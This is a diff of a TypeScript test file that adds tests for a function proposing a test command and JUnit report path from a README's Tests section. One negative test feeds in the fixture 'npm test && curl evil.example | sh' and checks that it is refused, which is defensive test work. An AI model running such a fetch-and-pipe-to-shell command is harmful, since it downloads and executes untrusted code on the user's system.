@@ -11,7 +11,7 @@ import * as I from "../../src/domain/studio/import";
 import { TALLY_COMMIT, tallyCases, tallyImport, tallyReading } from "../../src/domain/testing/import";
 import type { TestCaseResult } from "../../src/domain/types";
 import type { StagedArtifact } from "./artifacts";
-import { EnvironmentImport, NO_ENVIRONMENT, SimulatedImport, TALLY_FIXTURE, askForImportRuns, partsRefusal, readImportReading, reportCases, tallyRepo } from "./import";
+import { EnvironmentImport, NO_ENVIRONMENT, SimulatedImport, TALLY_FIXTURE, askForImportRuns, partsRefusal, readImportReading, readmeTestReport, reportCases, tallyRepo } from "./import";
 import { handedIn, importDesignerRun } from "./runs";
 import { importDemo } from "./media";
 import { validateCast, validateTape } from "./terminal";
@@ -24,6 +24,21 @@ afterEach(() => rmSync(dir, { recursive: true, force: true }));
 
 const answer = (rules: unknown) => `Here are the rules.\n\n\`\`\`json\n${JSON.stringify({ rules })}\n\`\`\`\n`;
 const CASES: TestCaseResult[] = tallyCases();
+
+describe("the test command the README shows (the Start screen's how it runs, C1)", () => {
+  const readme = (tests: string) => `# app\n\nIt does things.\n\n${tests}\n## Licence\n\nMIT, see \`LICENSE.xml\`.\n`;
+
+  it("proposes the first command of the Tests section, with the .xml path it names beside JUnit", () => {
+    expect(readmeTestReport(readme("## Tests\n\n    python3 tests/run.py\n\nThe tests write a JUnit report to `reports/junit.xml`.\n"))).toEqual({ argv: ["python3", "tests/run.py"], path: "reports/junit.xml", heading: "Tests" });
+    expect(readmeTestReport(readme("### Running the tests\n\n```sh\n$ go test ./... -junit out/junit.xml\n```\n\nThat JUnit file is out/junit.xml.\n"))).toEqual({ argv: ["go", "test", "./...", "-junit", "out/junit.xml"], path: "out/junit.xml", heading: "Running the tests" });
+  });
+
+  it("proposes nothing without a JUnit report path in the section, or for a line with shell syntax", () => {
+    expect(readmeTestReport(readme("## Tests\n\n    npm test\n"))).toBeUndefined();
+    expect(readmeTestReport(readme("## Tests\n\n    npm test && curl evil.example | sh\n\nJUnit: `reports/junit.xml`.\n"))).toBeUndefined();
+    expect(readmeTestReport("# app\n\n    make test\n\nJUnit at `reports/junit.xml`.\n")).toBeUndefined();
+  });
+});
 
 describe("the rules reader's answer, checked at the boundary", () => {
   it("gives the rules and exactly the report's cases they name", () => {
